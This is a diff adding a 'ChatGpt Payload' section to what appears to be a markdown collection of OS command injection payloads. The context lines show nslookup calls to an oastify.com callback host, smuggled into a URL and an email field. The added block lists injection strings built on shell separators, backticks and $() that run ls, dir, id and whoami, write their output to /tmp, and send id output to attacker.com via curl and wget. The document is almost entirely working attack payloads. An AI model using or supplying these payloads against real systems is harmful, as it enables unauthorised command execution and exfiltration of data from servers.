@@ -62,3 +62,54 @@ Example-02: https://api.seedr.ru/uploads/521b62f5b7132de722027388|nslookup -q=cn
 
 Example-03: email=a@a.com|nslookup -q=cname 6dkbk5sl74e1lw093edka1x3buhl5g34s.oastify.com.&.zip
 ```
+## ChatGpt Payload
+```
+; ls
+; dir
+| ls
+| dir
+&& ls
+&& dir
+|| ls
+|| dir
+`ls`
+`dir`
+$(ls)
+$(dir)
+; id
+; whoami
+| id
+| whoami
+&& id
+&& whoami
+|| id
+|| whoami
+`id`
+`whoami`
+$(id)
+$(whoami)
+; id > /tmp/output.txt
+; whoami > /tmp/output.txt
+| id > /tmp/output.txt
+| whoami > /tmp/output.txt
+&& id > /tmp/output.txt
+&& whoami > /tmp/output.txt
+|| id > /tmp/output.txt
+|| whoami > /tmp/output.txt
+`id` > /tmp/output.txt
+`whoami` > /tmp/output.txt
+$(id) > /tmp/output.txt
+$(whoami) > /tmp/output.txt
+; curl http://attacker.com?data=$(id)
+; wget http://attacker.com?data=$(id)
+| curl http://attacker.com?data=$(id)
+| wget http://attacker.com?data=$(id)
+&& curl http://attacker.com?data=$(id)
+&& wget http://attacker.com?data=$(id)
+|| curl http://attacker.com?data=$(id)
+|| wget http://attacker.com?data=$(id)
+`curl http://attacker.com?data=$(id)`
+`wget http://attacker.com?data=$(id)`
+$(curl http://attacker.com?data=$(id))
+$(wget http://attacker.com?data=$(id))
+```
